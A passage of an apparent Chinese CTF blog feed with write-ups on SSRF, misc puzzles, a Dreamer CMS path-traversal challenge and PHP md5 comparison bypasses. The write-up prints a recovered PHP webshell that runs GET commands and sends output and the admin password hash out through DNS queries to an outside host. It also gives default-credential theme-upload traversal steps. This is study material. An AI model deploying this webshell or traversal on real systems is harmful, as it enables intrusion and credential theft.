class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%33</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%36</span><span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%31</span><span class="hljs-variable">%32</span><span class="hljs-variable">%33</span><span class="hljs-variable">%34</span><span class="hljs-variable">%35</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%36</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%36</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><br></code></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1:换行需要使用<code>%0d%0a</code>替换<br>2:<code>/etc/hosts</code>和<code>/proc/net/arp</code>是查看网络信息的敏感文件</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>极客2021</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>第三届&quot;红明谷&quot;杯网络安全大赛wp</title>
    <url>/wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9D%E7%BA%A2%E6%98%8E%E8%B0%B7%E2%80%9C%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="阿尼亚"><a href="#阿尼亚" class="headerlink" title="阿尼亚"></a>阿尼亚</h2><p>文件尾有一串字符串<code>6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061</code>，十六进制转字符串得到<code>c383c39cc382c3abc38ec2aac2a3c2bac2bcc3b2c2b5c2a5c2b5c384c2b1c3a0c382c3ab0a</code></p>
<p>C383明显是中文编码，转十六进制后爆破得到密码<code>简单的编码</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-1.png"></p>
<p>根据图片名字<code>netpixeljihad</code>，使用<code>PixelJihad</code>解密，密码是<code>简单的编码</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-2.png"></p>
<p>得到压缩包的密码<code>P@Ss_W0RD:)</code></p>
<p>解压得到<code>+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-</code></p>
<p><a href="https://www.dcode.fr/code-decabit">在线解密</a>一把梭</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-3.png"></p>
<h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>流量分析，发现有个<code>shell.php</code>上传了一个<code>xxx1.php</code>，然后执行了<code>ls</code>和<code>cat secret.txt</code></p>
<p>格式化后如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$servername</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span>=<span class="hljs-string">&quot;zentao&quot;</span>;<br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=<span class="hljs-subst">$dbname</span>&quot;</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>,PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT password FROM zt_user WHERE account=\&#x27;admin\&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);<br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$param</span>);<br><span class="hljs-variable">$hex_output</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-variable">$hex_password</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$len_output</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_output</span>);<br><span class="hljs-variable">$len_password</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_password</span>);<br><span class="hljs-variable">$max_subdomain_length</span>=<span class="hljs-number">62</span>;<br><span class="hljs-variable">$subdomain_base</span>=<span class="hljs-string">&quot;yafgcy.ceye.io&quot;</span>;<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len_output</span>;<span class="hljs-variable">$i</span>++) &#123;<br>	<span class="hljs-variable">$char_output</span>=<span class="hljs-variable">$hex_output</span>[<span class="hljs-variable">$i</span>];<br>	<span class="hljs-variable">$char_password</span>=<span class="hljs-variable">$hex_password</span>[<span class="hljs-variable">$i</span>%<span class="hljs-variable">$len_password</span>];<br>	<span class="hljs-variable">$char_xor</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_output</span>)^<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_password</span>));<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>.<span class="hljs-variable">$char_xor</span>)&gt;<span class="hljs-variable">$max_subdomain_length</span>) &#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>		&#125;<br>		<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br>		<span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-variable">$hex_xor</span>.=<span class="hljs-variable">$char_xor</span>;<br>	&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br>	<span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>发现是<code>dns</code>流量</p>
<p>提取出<code>secret.txt</code>，根据代码可知要与<code>admin</code>的密码进行异或</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">79227024716c7522787370254c777230667673222570247b76677322632671<br>d7b357226771575227a7372237677702573611f372570317b7672772076206<br>1479207024777b60247e6674231a626727666171372570317f766773207620<br>067879226731756c60206d75703670754e<br><br>password:8a3e684c923b763d252cf1e8734a7a29<br></code></pre></td></tr></table></figure>

<p>异或后发现是<code>DNA</code>编码，每62位会少内容，爆破就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">mapping = &#123;<br><br><span class="hljs-string">&#x27;AAA&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<br><span class="hljs-string">&#x27;AAC&#x27;</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<br><span class="hljs-string">&#x27;AAG&#x27;</span>:<span class="hljs-string">&#x27;c&#x27;</span>,<br><span class="hljs-string">&#x27;AAT&#x27;</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<br><span class="hljs-string">&#x27;ACA&#x27;</span>:<span class="hljs-string">&#x27;e&#x27;</span>,<br><span class="hljs-string">&#x27;ACC&#x27;</span>:<span class="hljs-string">&#x27;f&#x27;</span>,<br><span class="hljs-string">&#x27;ACG&#x27;</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<br><span class="hljs-string">&#x27;ACT&#x27;</span>:<span class="hljs-string">&#x27;h&#x27;</span>,<br><span class="hljs-string">&#x27;AGA&#x27;</span>:<span class="hljs-string">&#x27;i&#x27;</span>,<br><span class="hljs-string">&#x27;AGC&#x27;</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<br><span class="hljs-string">&#x27;AGG&#x27;</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<br><span class="hljs-string">&#x27;AGT&#x27;</span>:<span class="hljs-string">&#x27;l&#x27;</span>,<br><span class="hljs-string">&#x27;ATA&#x27;</span>:<span class="hljs-string">&#x27;m&#x27;</span>,<br><span class="hljs-string">&#x27;ATC&#x27;</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<br><span class="hljs-string">&#x27;ATG&#x27;</span>:<span class="hljs-string">&#x27;o&#x27;</span>,<br><span class="hljs-string">&#x27;ATT&#x27;</span>:<span class="hljs-string">&#x27;p&#x27;</span>,<br><span class="hljs-string">&#x27;CAA&#x27;</span>:<span class="hljs-string">&#x27;q&#x27;</span>,<br><span class="hljs-string">&#x27;CAC&#x27;</span>:<span class="hljs-string">&#x27;r&#x27;</span>,<br><span class="hljs-string">&#x27;CAG&#x27;</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<br><span class="hljs-string">&#x27;CAT&#x27;</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<br><span class="hljs-string">&#x27;CCA&#x27;</span>:<span class="hljs-string">&#x27;u&#x27;</span>,<br><span class="hljs-string">&#x27;CCC&#x27;</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<br><span class="hljs-string">&#x27;CCG&#x27;</span>:<span class="hljs-string">&#x27;w&#x27;</span>,<br><span class="hljs-string">&#x27;CCT&#x27;</span>:<span class="hljs-string">&#x27;x&#x27;</span>,<br><span class="hljs-string">&#x27;CGA&#x27;</span>:<span class="hljs-string">&#x27;y&#x27;</span>,<br><span class="hljs-string">&#x27;CGC&#x27;</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<br><span class="hljs-string">&#x27;CGG&#x27;</span>:<span class="hljs-string">&#x27;A&#x27;</span>,<br><span class="hljs-string">&#x27;CGT&#x27;</span>:<span class="hljs-string">&#x27;B&#x27;</span>,<br><span class="hljs-string">&#x27;CTA&#x27;</span>:<span class="hljs-string">&#x27;C&#x27;</span>,<br><span class="hljs-string">&#x27;CTC&#x27;</span>:<span class="hljs-string">&#x27;D&#x27;</span>,<br><span class="hljs-string">&#x27;CTG&#x27;</span>:<span class="hljs-string">&#x27;E&#x27;</span>,<br><span class="hljs-string">&#x27;CTT&#x27;</span>:<span class="hljs-string">&#x27;F&#x27;</span>,<br><span class="hljs-string">&#x27;GAA&#x27;</span>:<span class="hljs-string">&#x27;G&#x27;</span>,<br><span class="hljs-string">&#x27;GAC&#x27;</span>:<span class="hljs-string">&#x27;H&#x27;</span>,<br><span class="hljs-string">&#x27;GAG&#x27;</span>:<span class="hljs-string">&#x27;I&#x27;</span>,<br><span class="hljs-string">&#x27;GAT&#x27;</span>:<span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;GCA&#x27;</span>:<span class="hljs-string">&#x27;K&#x27;</span>,<br><span class="hljs-string">&#x27;GCC&#x27;</span>:<span class="hljs-string">&#x27;L&#x27;</span>,<br><span class="hljs-string">&#x27;GCG&#x27;</span>:<span class="hljs-string">&#x27;M&#x27;</span>,<br><span class="hljs-string">&#x27;GCT&#x27;</span>:<span class="hljs-string">&#x27;N&#x27;</span>,<br><span class="hljs-string">&#x27;GGA&#x27;</span>:<span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;GGC&#x27;</span>:<span class="hljs-string">&#x27;P&#x27;</span>,<br><span class="hljs-string">&#x27;GGG&#x27;</span>:<span class="hljs-string">&#x27;Q&#x27;</span>,<br><span class="hljs-string">&#x27;GGT&#x27;</span>:<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-string">&#x27;GTA&#x27;</span>:<span class="hljs-string">&#x27;S&#x27;</span>,<br><span class="hljs-string">&#x27;GTC&#x27;</span>:<span class="hljs-string">&#x27;T&#x27;</span>,<br><span class="hljs-string">&#x27;GTG&#x27;</span>:<span class="hljs-string">&#x27;U&#x27;</span>,<br><span class="hljs-string">&#x27;GTT&#x27;</span>:<span class="hljs-string">&#x27;V&#x27;</span>,<br><span class="hljs-string">&#x27;TAA&#x27;</span>:<span class="hljs-string">&#x27;W&#x27;</span>,<br><span class="hljs-string">&#x27;TAC&#x27;</span>:<span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;TAG&#x27;</span>:<span class="hljs-string">&#x27;Y&#x27;</span>,<br><span class="hljs-string">&#x27;TAT&#x27;</span>:<span class="hljs-string">&#x27;Z&#x27;</span>,<br><span class="hljs-string">&#x27;TCA&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;TCC&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<br><span class="hljs-string">&#x27;TCG&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<br><span class="hljs-string">&#x27;TCT&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br><span class="hljs-string">&#x27;TGA&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<br><span class="hljs-string">&#x27;TGC&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<br><span class="hljs-string">&#x27;TGG&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<br><span class="hljs-string">&#x27;TGT&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;TTA&#x27;</span>:<span class="hljs-string">&#x27;9&#x27;</span>,<br><span class="hljs-string">&#x27;TTC&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;TTG&#x27;</span>:<span class="hljs-string">&#x27; &#x27;</span>,<br><span class="hljs-string">&#x27;TTT&#x27;</span>:<span class="hljs-string">&#x27;.&#x27;</span><br><br><br>&#125;<br><br><br>encode_string = <span class="hljs-string">&#x27;OME&#x27;</span><br><br>decode_string = <span class="hljs-string">&#x27;GGAGCGCTG&#x27;</span> <br><br>inverted_mapping = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(mapping.values(), mapping.keys()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_dna</span>(<span class="hljs-params"> decode_string </span>):<br><br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(decode_string), <span class="hljs-number">3</span> ):<br>        piece =  decode_string[i:i+<span class="hljs-number">3</span>]<br>        <span class="hljs-comment"># pieces.append()</span><br>        pieces.append( mapping[piece] )<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_dna</span>(<span class="hljs-params">encode_string</span>):<br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encode_string:<br>        piece =  inverted_mapping[i]<br>        pieces.append(piece)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Decoded String is:- &#x27;</span>+ decode_dna(decode_string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Encoded DNA String is:- &#x27;</span>+ encode_dna(encode_string)<br></code></pre></td></tr></table></figure>




<h2 id="X光的秘密"><a href="#X光的秘密" class="headerlink" title="X光的秘密"></a>X光的秘密</h2><p>给了个<code>task.dcm</code>文件，百度到能打开的软件<a href="https://www.microdicom.com/downloads.html">MicroDicom</a></p>
<p>使用软件导出，一共有二十张</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-1.png"></p>
<p>使用stegsolve发现最后三张图存在LSB</p>
<p>脚本提取出最低位数据，因为是灰度图，所以用其中一个通道就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;img-00001-00018.png&#x27;</span>)<br>w,h=img.size<br><br>rgb=[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        data=img.getpixel((i,j))<br>        rgb[<span class="hljs-number">0</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">1</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">1</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">2</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>]%<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r1: &#x27;</span>+rgb[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(&#x27;glow: &#x27;+rgb[1])</span><br><span class="hljs-comment">#print(&#x27;blow: &#x27;+rgb[2])</span><br><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>content = <span class="hljs-built_in">str</span>(rgb[<span class="hljs-number">0</span>])<br>file.write(content)<br>file.close()<br></code></pre></td></tr></table></figure>

<p>img-00001-00018.png</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">100100010010110001101000000000<br></code></pre></td></tr></table></figure>

<p>img-00001-00019.png</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">0110000110101001010000000000000<br></code></pre></td></tr></table></figure>

<p>img-00001-00020.png</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">0001011001000010000010000000001<br></code></pre></td></tr></table></figure>

<p>将三张图片按顺序拼接发现刚好是<code>10001001</code>，<code>0x89</code>为<code>PNG</code>的头</p>
<p>使用脚本合并</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r.txt&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r2.txt&quot;</span>)<br>f3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r3.txt&quot;</span>)<br>d1=f1.read()<br>d2=f2.read()<br>d3=f3.read()<br><br>new=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(d1):<br>    new+=v+d2[i]+d3[i]<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>file.write(new)<br>file.close()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-2.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h2><p>签到，点点点</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-1.png"></p>
<h2 id="Dreamer-amp-amp-Dreamer-revenge"><a href="#Dreamer-amp-amp-Dreamer-revenge" class="headerlink" title="Dreamer &amp;&amp; Dreamer_revenge"></a>Dreamer &amp;&amp; Dreamer_revenge</h2><p>参考<a href="https://forum.butian.net/share/2183#/">Dreamer CMS 代码审计</a></p>
<p>默认后台管理员账号密码为<code>wangjn/123456</code></p>
<p>在源码中复制一份<code>\src\main\resources\db\dreamer-cms\templates\default_v2</code>，修改<code>theme.json</code>文件中的<code>themePath</code>为<code>../../../../../../../../../../../</code>，然后打包成压缩包，在后台<code>风格管理</code>处上传</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-1.png"></p>
<p>启用后在<code>模板管理</code>处就可以看到跟目录下的文件了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-2.png"></p>
<p><code>Dreamer_revenge</code>的步骤与<code>Dreamer</code>一致，不过flag在<code>/proc/1/environ</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-3.png"></p>
<h2 id="Eyou"><a href="#Eyou" class="headerlink" title="Eyou"></a>Eyou</h2><p>EyouCMS v1.6.1 反序列化漏洞</p>
<p>参考<a href="https://n1k0la-t.github.io/2023/01/28/EyouCMS%20v1.6.1%200day%E6%8C%96%E6%8E%98/">EyouCMS v1.6.1 0day挖掘</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>红明谷</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中关于md5的一些总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/CTF%E4%B8%AD%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="MD5弱类型比较"><a href="#MD5弱类型比较" class="headerlink" title="MD5弱类型比较"></a>MD5弱类型比较</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br>	&#123;<br>		<span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])))<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>方法一：数组绕过</strong></p>
<p>由于md5不能加密数组，在加密数组的时候会返回NULL，所以我们可以传入两个数组来绕过</p>
<p><strong>方法二：科学计数法绕过</strong></p>
<p>可以传入两个md5加密后是0e开头的字符串，需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">s878926199a<br>0e545993274517709034328855841020<br><br>s155964671a<br>0e342768416822451524974117254469<br><br>s214587387a<br>0e848240448830537924465865611904<br><br>QLTHNDT<br>0e405967825401955372549139051580<br><br>QNKCDZO<br>0e830400451993494058024219903391<br><br>EEIZDOI<br>0e782601363539291779881938479162<br><br>240610708<br>0e462097431906509019562988736854<br></code></pre></td></tr></table></figure>


<h1 id="MD5强类型比较"><a href="#MD5强类型比较" class="headerlink" title="MD5强类型比较"></a>MD5强类型比较</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br>	&#123;<br>		<span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">md5</span>(<span 